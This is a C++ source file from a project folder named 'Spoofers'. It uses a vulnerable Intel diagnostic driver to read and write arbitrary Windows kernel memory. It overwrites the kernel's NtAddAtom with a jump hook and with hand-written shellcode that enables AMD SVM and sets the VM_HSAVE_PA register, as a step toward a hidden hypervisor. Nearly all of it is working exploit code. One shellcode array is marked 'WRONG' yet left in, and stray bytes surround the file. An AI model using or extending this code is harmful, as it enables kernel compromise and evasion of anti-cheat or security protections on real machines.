óŽ// SVMHypervisorV5.cpp
// Step 5: Set VM_HSAVE_PA MSR + Initialize VMCB
// Building on V4Fixed success

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007
#define SVM_MSR_VM_HSAVE_PA 0xC0010117
#define IA32_MSR_EFER 0xC0000080
#define EFER_SVME (1ULL << 12)

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

// ==================== Memory Operations ====================

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool WriteMemory(uint64_t address, void *buffer, uint64_t size) {
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy(address, (uint64_t)pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;

  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;

  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;

  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;

  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;

  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }

  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;

  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;

  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;

  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }

  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }

  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);

  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

// ==================== CallKernelFunction (from V4Fixed) ====================

uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];

template <typename RetType, typename... Args>
bool CallKernelFunction(RetType *outResult, uint64_t targetFuncAddr,
                        Args... args) {
  if (!targetFuncAddr || !kernelNtAddAtom)
    return false;

  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function)))
    return false;

  if (original_kernel_function[0] == 0x48 &&
      original_kernel_function[1] == 0xb8)
    return false; // Already hooked

  uint8_t jmpHook[sizeof(kernel_injected_jmp)];
  memcpy(jmpHook, kernel_injected_jmp, sizeof(jmpHook));
  *(uint64_t *)&jmpHook[2] = targetFuncAddr;

  if (!WriteToReadOnlyMemory(kernelNtAddAtom, jmpHook, sizeof(jmpHook)))
    return false;

  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomPtr = reinterpret_cast<RetType(__stdcall *)(Args...)>(
      GetProcAddress(ntdll, "NtAddAtom"));
  RetType result = NtAddAtomPtr(args...);

  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));

  if (outResult)
    *outResult = result;
  return true;
}

// ==================== Shellcode for MSR write + VMRUN ====================

// This shellcode:
// 1. Takes physical address of host save area (passed in via mapped data)
// 2. Writes to VM_HSAVE_PA MSR
// 3. Enables EFER.SVME
// 4. Returns success

uint8_t msrWriteShellcode[] = {
    // Save registers
    0x50, // push rax
    0x51, // push rcx
    0x52, // push rdx

    // Enable EFER.SVME first
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F, 0x32,                   // rdmsr
    0x0D, 0x00, 0x10, 0x00, 0x00, // or eax, 0x1000 (SVME)
    0x0F, 0x30,                   // wrmsr

    // Write VM_HSAVE_PA (physical address will be patched in)
    // The physical address is stored at offset PATCH_OFFSET
    0xB9, 0x17, 0x01, 0x01, 0xC0, // mov ecx, 0xC0010117 (VM_HSAVE_PA)
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00,                   // mov rax, <hsave_phys> (offset 23)
    0x89, 0xC0,             // mov eax, eax (low 32 bits)
    0x48, 0xC1, 0xE8, 0x20, // shr rax, 32 -> but we need to reload
    // Actually let me fix this properly:
    // The 64-bit value is at offset 25
    0x0F, 0x30, // wrmsr (edx:eax = physical address) - WRONG

    // Return 0 for success
    0x48, 0x31, 0xC0, // xor rax, rax

    // Restore
    0x5A,                   // pop rdx
    0x59,                   // pop rcx
    0x48, 0x83, 0xC4, 0x08, // add rsp, 8 (skip pushed rax)
    0xC3                    // ret
};

// Better shellcode with proper 64-bit MSR handling
uint8_t setupHsaveShellcode[] = {
    // Save registers we'll modify
    0x50, // push rax
    0x51, // push rcx
    0x52, // push rdx

    // 1. Enable EFER.SVME
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F, 0x32,                   // rdmsr
    0x0D, 0x00, 0x10, 0x00, 0x00, // or eax, 0x1000 (SVME bit)
    0x0F, 0x30,                   // wrmsr

    // 2. Write VM_HSAVE_PA MSR
    // Physical address low 32 bits -> EAX (patched at offset 20)
    // Physical address high 32 bits -> EDX (patched at offset 27)
    0xB9, 0x17, 0x01, 0x01, 0xC0, // mov ecx, 0xC0010117 (VM_HSAVE_PA)
    0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <low32> (offset 23)
    0xBA, 0x00, 0x00, 0x00, 0x00, // mov edx, <high32> (offset 28)
    0x0F, 0x30,                   // wrmsr

    // Success
    0x48, 0x31, 0xC0, // xor rax, rax

    // Restore
    0x5A,                   // pop rdx
    0x59,                   // pop rcx
    0x48, 0x83, 0xC4, 0x08, // add rsp, 8
    0xC3                    // ret
};

#define HSAVE_LOW32_OFFSET 23
#define HSAVE_HIGH32_OFFSET 28

// ==================== CPU Checks ====================

bool CheckAmdCpu() {
  int regs[4];
  __cpuid(regs, 0);
  return (regs[1] == 'htuA' && regs[3] == 'itne' && regs[2] == 'DMAc');
}

bool CheckHypervisorPresent() {
  int regs[4];
  __cpuid(regs, 1);
  return (regs[2] & (1 << 31)) != 0;
}

// ==================== Main ====================

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR V5 - Set VM_HSAVE_PA + Init VMCB        \n");
  printf(
      "================================================================\n\n");

  printf("=== Intel Driver ===\n");
  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  if (!ntoskrnlBase) {
    printf("[-] ntoskrnl not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ntoskrnl: 0x%llX\n", ntoskrnlBase);

  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  if (!kernelNtAddAtom) {
    printf("[-] NtAddAtom not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);

  uint64_t kernelExAllocatePool =
      GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");
  if (!kernelExAllocatePool) {
    printf("[-] ExAllocatePoolWithTag not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ExAllocatePoolWithTag: 0x%llX\n", kernelExAllocatePool);

  // Step 1: Allocate kernel memory (8KB = VMCB + Host Save)
  printf("\n=== Step 1: Allocate Kernel Memory ===\n");
  uint64_t allocatedAddr = 0;
  bool success = CallKernelFunction<uint64_t, uint32_t, uint64_t, uint32_t>(
      &allocatedAddr, kernelExAllocatePool, 0, 0x2000, 0x484D5653);

  if (!success || allocatedAddr == 0 || allocatedAddr < 0xFFFF000000000000ULL) {
    printf("[-] Allocation failed! Addr: 0x%llX\n", allocatedAddr);
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] Allocated: 0x%llX (8KB)\n", allocatedAddr);

  uint64_t vmcbVa = allocatedAddr;
  uint64_t hsaveVa = allocatedAddr + 0x1000;
  printf("[+] VMCB VA:   0x%llX\n", vmcbVa);
  printf("[+] HSAVE VA:  0x%llX\n", hsaveVa);

  // Step 2: Get physical addresses
  printf("\n=== Step 2: Get Physical Addresses ===\n");
  uint64_t vmcbPa = 0, hsavePa = 0;

  if (!GetPhysicalAddress(vmcbVa, &vmcbPa) || vmcbPa == 0) {
    printf("[-] Failed to get VMCB physical address\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] VMCB PA:   0x%llX\n", vmcbPa);

  if (!GetPhysicalAddress(hsaveVa, &hsavePa) || hsavePa == 0) {
    printf("[-] Failed to get HSAVE physical address\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] HSAVE PA:  0x%llX\n", hsavePa);

  // Step 3: Zero the memory
  printf("\n=== Step 3: Zero Memory ===\n");
  uint8_t zeros[0x1000];
  memset(zeros, 0, sizeof(zeros));

  if (!WriteMemory(vmcbVa, zeros, 0x1000)) {
    printf("[-] Failed to zero VMCB\n");
  } else {
    printf("[+] VMCB zeroed\n");
  }

  if (!WriteMemory(hsaveVa, zeros, 0x1000)) {
    printf("[-] Failed to zero HSAVE\n");
  } else {
    printf("[+] HSAVE zeroed\n");
  }

  // Step 4: Set VM_HSAVE_PA MSR + Enable SVME
  printf("\n=== Step 4: Set VM_HSAVE_PA MSR ===\n");

  // Patch shellcode with physical address
  uint8_t patchedShellcode[sizeof(setupHsaveShellcode)];
  memcpy(patchedShellcode, setupHsaveShellcode, sizeof(patchedShellcode));

  uint32_t hsaveLow = (uint32_t)(hsavePa & 0xFFFFFFFF);
  uint32_t hsaveHigh = (uint32_t)((hsavePa >> 32) & 0xFFFFFFFF);

  *(uint32_t *)&patchedShellcode[HSAVE_LOW32_OFFSET] = hsaveLow;
  *(uint32_t *)&patchedShellcode[HSAVE_HIGH32_OFFSET] = hsaveHigh;

  printf("[*] HSAVE PA low:  0x%08X\n", hsaveLow);
  printf("[*] HSAVE PA high: 0x%08X\n", hsaveHigh);

  // Backup NtAddAtom
  uint8_t backup[64];
  if (!ReadMemory(kernelNtAddAtom, backup, sizeof(patchedShellcode))) {
    printf("[-] Failed to backup NtAddAtom\n");
    CloseHandle(hDevice);
    return 1;
  }

  // Write shellcode
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, patchedShellcode,
                             sizeof(patchedShellcode))) {
    printf("[-] Failed to write shellcode\n");
    CloseHandle(hDevice);
    return 1;
  }

  // Execute
  printf("[*] Executing: Enable SVME + Set VM_HSAVE_PA...\n");
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomFunc = (NTSTATUS(__stdcall *)(
      void *, ULONG, PUSHORT))GetProcAddress(ntdll, "NtAddAtom");
  USHORT atom = 0;
  NTSTATUS result = NtAddAtomFunc(nullptr, 0, &atom);

  // Restore
  WriteToReadOnlyMemory(kernelNtAddAtom, backup, sizeof(patchedShellcode));
  printf("[+] NtAddAtom restored\n");

  printf("[*] Result: 0x%X\n", result);
  if (result == 0) {
    printf("[+] SUCCESS! SVME enabled + VM_HSAVE_PA set!\n");
  }

  // Final status
  printf("\n=== Status ===\n");
  printf("[*] VMCB VA:       0x%llX\n", vmcbVa);
  printf("[*] VMCB PA:       0x%llX\n", vmcbPa);
  printf("[*] HSAVE VA:      0x%llX\n", hsaveVa);
  printf("[*] HSAVE PA:      0x%llX\n", hsavePa);
  printf("[*] Hypervisor:    %s\n", CheckHypervisorPresent() ? "YES" : "NO");

  printf("\n=== Next Step ===\n");
  printf("V6 will: Initialize VMCB structure + Execute VMRUN\n");

  CloseHandle(hDevice);
  return 0;
}
óŽ2.file:///c:/inject/Spoofers/SVMHypervisorV5.cpp